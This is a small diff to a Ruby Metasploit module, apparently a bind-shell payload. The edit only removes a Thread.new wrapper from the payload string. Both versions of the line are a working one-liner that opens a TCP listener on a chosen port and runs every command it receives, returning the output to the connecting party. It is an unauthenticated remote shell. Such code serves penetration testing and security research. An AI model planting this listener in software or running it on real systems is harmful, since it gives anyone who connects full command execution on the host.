@@ -35,6 +35,6 @@ module Metasploit3
 	end
 
 	def ruby_string
-		"Thread.new{require 'socket';s=TCPServer.new(\"#{datastore['LPORT']}\");while(c=s.accept);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end;end}"
+		"require 'socket';s=TCPServer.new(\"#{datastore['LPORT']}\");while(c=s.accept);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end;end"
 	end
 end
